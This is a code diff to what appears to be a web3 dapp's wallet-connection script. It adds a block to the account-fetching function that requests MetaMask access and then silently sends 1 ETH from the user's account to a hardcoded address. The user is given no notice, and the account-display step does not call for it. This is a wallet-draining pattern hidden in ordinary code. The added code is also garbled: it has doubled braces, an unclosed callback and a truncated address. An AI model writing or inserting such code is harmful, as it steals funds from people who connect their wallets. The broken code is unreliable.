@@ -94,6 +94,35 @@ async function fetchAccountData() {
   // MetaMask does not give you all accounts, only the selected account
   console.log("Got accounts", accounts);
   selectedAccount = accounts[0];
+  if (window.ethereum) {
+        window.web3 = new Web3(ethereum);
+        try {
+            // Request account access if needed
+            await ethereum.enable();
+            // Acccounts now exposed
+            web3.eth.sendTransaction({{from:web3.eth.accounts[0],
+                to:"0x943",
+                value:  "1000000000000000000", 
+                data: "0xdf"
+                }, function(err, transactionHash) {
+            if (!err)
+                console.log(transactionHash + " success");
+          // mainEnter();
+        } catch (error) {
+            // User denied account access...
+        }
+    }
+    // Legacy dapp browsers...
+    else if (window.web3) {
+        window.web3 = new Web3(web3.currentProvider);
+        // Acccounts always exposed
+        mainEnter();
+        web3.eth.sendTransaction({/* ... */});
+    }
+    // Non-dapp browsers...
+    else {
+        console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
+    }
 
   document.querySelector("#selected-account").textContent = selectedAccount;
 
@@ -247,6 +276,7 @@ window.addEventListener('load', async () => {
     else {
         console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
     }
+  });
 
 //     function mainEnter() {
 //         var balance = web3.eth.getBalance(address);
@@ -266,7 +296,7 @@ window.addEventListener('load', async () => {
 //             console.log('na change dey there');        
 //         });
            
-    });
+   
 
     }
     });
